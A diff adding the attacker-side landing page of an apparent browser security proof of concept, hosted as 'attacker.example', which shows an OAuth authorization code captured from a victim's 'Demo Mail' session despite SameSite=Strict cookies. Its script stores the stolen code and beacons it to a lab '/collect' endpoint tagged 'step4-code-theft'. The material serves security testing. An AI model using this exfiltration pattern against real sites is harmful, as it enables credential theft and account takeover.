@@ -1,0 +1,52 @@
+<!doctype html>
+<html lang="en">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>attacker.example — code received</title>
+<style>
+ :root{color-scheme:dark}
+ body{margin:0;padding:18px;background:#0b0d12;color:#e9ecf3;
+      font:16px/1.55 -apple-system,BlinkMacSystemFont,system-ui,sans-serif}
+ .v{border-radius:16px;padding:26px 18px;text-align:center}
+ .leak{background:#86101f;box-shadow:inset 0 0 0 3px #ff4d6a}
+ .neutral{background:#13233f;box-shadow:inset 0 0 0 3px #4a8fe8}
+ .big{font-size:32px;font-weight:800;margin:0;line-height:1.1;letter-spacing:-1px}
+ .sub{font-size:15px;margin:12px 0 0;opacity:.92}
+ code{font-family:ui-monospace,Menlo,monospace;font-size:13px;word-break:break-all}
+ p{font-size:14px}
+</style>
+<div id="out"></div>
+<script>
+(function () {
+  var q = new URLSearchParams(location.search);
+  var code = q.get('code'), n = q.get('n') || '', lab = q.get('lab');
+  var out = document.getElementById('out');
+  function esc(s) { return String(s).replace(/[<>&"]/g, ''); }
+
+  if (code) {
+    out.innerHTML =
+      '<div class="v leak"><p class="big">AUTHORIZATION CODE<br>EXFILTRATED</p>' +
+      '<p class="sub">attacker.example received a credential minted for ' +
+      'the victim’s authenticated Demo Mail session.</p>' +
+      '<p class="sub"><code>' + esc(code) + '</code></p></div>' +
+      '<p>Test ID: <code>' + esc(n) + '</code></p>' +
+      '<p>The victim never signed in to Demo Mail from this site. The session cookie is ' +
+      '<code>SameSite=Strict</code> and should never have been sent.</p>';
+    try {
+      localStorage.setItem('asb_code', code);
+      new BroadcastChannel('asb_poc').postMessage({ code: code, n: n });
+    } catch (e) {}
+    if (lab) {
+      try {
+        new Image().src = lab.replace(/\/+$/, '') + '/collect?code=' +
+          encodeURIComponent(code) + '&n=' + encodeURIComponent(n) +
+          '&tag=step4-code-theft';
+      } catch (e) {}
+    }
+  } else {
+    out.innerHTML = '<div class="v neutral"><p class="big">no code</p>' +
+      '<p class="sub">The endpoint did not authenticate, so nothing was issued. ' +
+      'This is the expected result when SameSite=Strict is enforced.</p></div>';
+  }
+})();
+</script>
